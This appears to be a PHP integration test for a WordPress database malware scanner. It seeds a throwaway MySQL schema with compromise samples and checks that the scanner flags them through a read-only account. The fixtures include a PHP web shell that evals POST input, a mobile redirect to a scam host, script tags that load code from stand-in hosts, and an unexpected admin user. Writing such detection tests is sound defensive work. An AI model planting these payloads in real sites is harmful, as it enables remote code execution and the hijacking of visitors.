<?php

namespace Tests\Feature\DbScanner;

use App\Models\DbScanConnection;
use App\Models\DbScanFinding;
use App\Models\DbScanMarketRun;
use App\Services\DbScanner\Engine\PassController;
use App\Services\DbScanner\Engine\Preflight;
use App\Services\DbScanner\Reader\MarketDbReader;
use App\Services\DbScanner\Reader\ReaderTarget;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Str;
use PDO;
use Tests\Feature\DbScanner\Concerns\BuildsWordPressFixture;
use Tests\TestCase;

/**
 * Opt-in engine suite against a real MySQL/MariaDB server with a throwaway
 * schema and a least-privilege reader account. Never points at a market or
 * the CRM database.
 *
 *   DB_SCANNER_ENGINE_IT=1 DB_SCANNER_IT_SOCKET=/path/mysqld.sock \
 *   DB_SCANNER_IT_ROOT_USER=root DB_SCANNER_IT_ROOT_PASSWORD=… \
 *   php artisan test --filter=DbScannerMysqlEngineTest
 */
class DbScannerMysqlEngineTest extends TestCase
{
    use BuildsWordPressFixture;
    use RefreshDatabase;

    private ?PDO $root = null;

    private string $schema = '';

    private string $reader = '';

    private string $readerPassword = '';

    protected function setUp(): void
    {
        parent::setUp();
        if (! getenv('DB_SCANNER_ENGINE_IT')) {
            $this->markTestSkipped('Opt-in engine suite: set DB_SCANNER_ENGINE_IT=1 and the root connection variables.');
        }

        Queue::fake();
        $this->bootScanner();
        $this->root = new PDO(
            'mysql:unix_socket='.getenv('DB_SCANNER_IT_SOCKET').';charset=utf8mb4',
            getenv('DB_SCANNER_IT_ROOT_USER') ?: 'root',
            getenv('DB_SCANNER_IT_ROOT_PASSWORD') ?: '',
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
        );

        $suffix = strtolower(Str::random(8));
        $this->schema = 'dbscan_it_'.$suffix;
        $this->reader = 'dbscan_ro_'.$suffix;
        $this->readerPassword = Str::random(24);

        $this->root->exec("CREATE DATABASE `{$this->schema}` CHARACTER SET utf8mb4");
        $this->root->exec("CREATE USER '{$this->reader}'@'localhost' IDENTIFIED BY '{$this->readerPassword}'");
        $this->root->exec("GRANT SELECT ON `{$this->schema}`.* TO '{$this->reader}'@'localhost'");
        $this->root->exec("USE `{$this->schema}`");
        $this->seedMysqlMarket();
    }

    protected function tearDown(): void
    {
        if ($this->root && $this->schema !== '') {
            $this->root->exec("DROP DATABASE IF EXISTS `{$this->schema}`");
            $this->root->exec("DROP USER IF EXISTS '{$this->reader}'@'localhost'");
        }
        parent::tearDown();
    }

    private function seedMysqlMarket(): void
    {
        $r = $this->root;
        $r->exec('CREATE TABLE wp_options (option_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY, option_name VARCHAR(191) UNIQUE, option_value LONGTEXT, autoload VARCHAR(20) DEFAULT "yes") ENGINE=InnoDB');
        $r->exec('CREATE TABLE wp_users (ID BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY, user_login VARCHAR(60), user_pass VARCHAR(255), user_nicename VARCHAR(50), user_email VARCHAR(100), user_url VARCHAR(100) DEFAULT "", user_registered DATETIME, user_activation_key VARCHAR(255) DEFAULT "", user_status INT DEFAULT 0, display_name VARCHAR(250)) ENGINE=InnoDB');
        $r->exec('CREATE TABLE wp_usermeta (umeta_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY, user_id BIGINT UNSIGNED, meta_key VARCHAR(255), meta_value LONGTEXT) ENGINE=InnoDB');
        $r->exec('CREATE TABLE wp_posts (ID BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY, post_author BIGINT UNSIGNED DEFAULT 1, post_date DATETIME, post_content LONGTEXT, post_title TEXT, post_excerpt TEXT, post_status VARCHAR(20) DEFAULT "publish", post_name VARCHAR(200) DEFAULT "", post_parent BIGINT UNSIGNED DEFAULT 0, post_type VARCHAR(20) DEFAULT "post", post_password VARCHAR(255) DEFAULT "") ENGINE=InnoDB');
        $r->exec('CREATE TABLE wp_postmeta (meta_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY, post_id BIGINT UNSIGNED, meta_key VARCHAR(255), meta_value LONGTEXT) ENGINE=InnoDB');
        $r->exec('CREATE TABLE wp_term_taxonomy (term_taxonomy_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY, term_id BIGINT UNSIGNED, taxonomy VARCHAR(32), description LONGTEXT, parent BIGINT UNSIGNED DEFAULT 0, count BIGINT DEFAULT 0) ENGINE=InnoDB');

        $opt = $r->prepare('INSERT INTO wp_options (option_name, option_value, autoload) VALUES (?, ?, ?)');
        foreach ([
            ['siteurl', 'https://mysql-market.test', 'yes'],
            ['home', 'https://mysql-market.test', 'yes'],
            ['blog_public', '1', 'yes'],
            ['active_plugins', serialize(['wordpress-seo/wp-seo.php', 'crawl-page-optimizer/crawl-page-optimizer.php']), 'yes'],
            ['wp_user_roles', serialize(['administrator' => ['capabilities' => ['manage_options' => true]]]), 'yes'],
            ['smtp_password', '<script src="https://never-read.test/x.js"></script>', 'yes'],
            ['ihaf_insert_header', '<script>if(navigator.userAgent.indexOf("Mobile")>-1){location.replace("https://mobile-scam.test/")}</script>', 'yes'],
        ] as $row) {
            $opt->execute($row);
        }
        $r->exec("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, display_name) VALUES ('support_admin', 'hash', 'x', 'support_admin@wordpress.com', '2024-01-01 00:00:00', 'Support')");
        $r->exec("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (1, 'wp_capabilities', '".serialize(['administrator' => true])."')");
        $post = $r->prepare('INSERT INTO wp_posts (post_date, post_content, post_title, post_excerpt, post_type) VALUES (?, ?, ?, ?, ?)');
        $post->execute(['2026-01-01 00:00:00', '<?php eval($_POST["x"]); ?>', 'x', '', 'oembed_x']);
        $post->execute(['2026-01-01 00:00:00', str_repeat('é', 70000).'<script src="https://beyond-cap.test/a.js"></script>', 'Long', '', 'post']);
        $post->execute(['2026-01-01 00:00:00', '<script src="https://after-long.test/a.js"></script>', 'After', '', 'post']);
        $r->exec('CREATE TRIGGER wp_posts_lock BEFORE UPDATE ON wp_posts FOR EACH ROW SET NEW.post_title = OLD.post_title');
    }

    private function target(?string $user = null, ?string $password = null): ReaderTarget
    {
        return new ReaderTarget(0, 'mysql', 'localhost', 3306, (string) getenv('DB_SCANNER_IT_SOCKET'), $this->schema, $user ?? $this->reader, $password ?? $this->readerPassword, 'wp_', 'none', null, 'local', 1, 3, 5);
    }

    public function test_reader_session_is_read_only_with_a_verified_timeout(): void
    {
        $reader = new MarketDbReader($this->target());
        $reader->open();
        $this->assertStringStartsWith('8.', $reader->engine());
        $this->assertSame('1', (string) $reader->fetchScalar($reader->compiler()->readOnlyState('transaction_read_only'), 'ro'));
        $this->assertSame(3000.0, (float) $reader->fetchScalar($reader->compiler()->timeoutState(false), 't'));
        $reader->close();
    }

    public function test_full_scan_through_a_select_only_account(): void
    {
        $platform = $this->marketPlatform('MySQL market', 'mysql-market.test');
        DbScanConnection::query()->create([
            'platform_id' => $platform->id, 'driver' => 'mysql', 'host' => 'localhost', 'socket' => getenv('DB_SCANNER_IT_SOCKET'),
            'database' => $this->schema, 'username' => $this->reader, 'password' => $this->readerPassword, 'prefix' => 'wp_',
            'host_group' => 'local', 'config_version' => 1, 'enabled' => true, 'preflight_status' => 'never',
        ]);
        $connection = DbScanConnection::query()->firstOrFail();

        $result = app(Preflight::class)->run($connection, null);
        $this->assertSame('passed', $result['status'], json_encode($result));
        $this->assertFalse($result['capabilities']['trigger_visibility_exhaustive']);

        app(PassController::class)->start([$platform->id], 'standard', 'manual');
        $this->drain();

        $run = DbScanMarketRun::query()->where('mode', 'scan')->firstOrFail();
        $this->assertSame('completed_with_gaps', $run->status, 'Trigger visibility is unverified for a SELECT-only account.');
        $rules = DbScanFinding::query()->pluck('rule_key')->all();
        $this->assertContains('access.admin_unexpected_email', $rules);
        $this->assertContains('persistence.plugin_not_allowlisted', $rules);
        $this->assertContains('malware.db_webshell', $rules);
        $this->assertContains('malware.redirect_or_overlay', $rules);
        $this->assertTrue(DbScanFinding::query()->where('rule_key', 'malware.remote_loader')->get()->contains(fn ($f) => str_contains(json_encode($f->evidence), 'after-long.test')));
        $this->assertFalse(DbScanFinding::query()->get()->contains(fn ($f) => str_contains(json_encode($f->evidence), 'beyond-cap.test') || str_contains(json_encode($f->evidence), 'never-read.test')));
    }

    public function test_preflight_rejects_a_writable_account(): void
    {
        $platform = $this->marketPlatform('MySQL market', 'mysql-market.test');
        $connection = DbScanConnection::query()->create([
            'platform_id' => $platform->id, 'driver' => 'mysql', 'host' => 'localhost', 'socket' => getenv('DB_SCANNER_IT_SOCKET'),
            'database' => $this->schema, 'username' => getenv('DB_SCANNER_IT_ROOT_USER') ?: 'root', 'password' => getenv('DB_SCANNER_IT_ROOT_PASSWORD') ?: '',
            'prefix' => 'wp_', 'host_group' => 'local', 'config_version' => 1, 'enabled' => true, 'preflight_status' => 'never',
        ]);

        $result = app(Preflight::class)->run($connection, null);
        $this->assertSame('failed', $result['status']);
        $this->assertSame('grants_not_select_only', $result['code']);
        $this->assertFalse($connection->fresh()->preflightValid());
    }
}
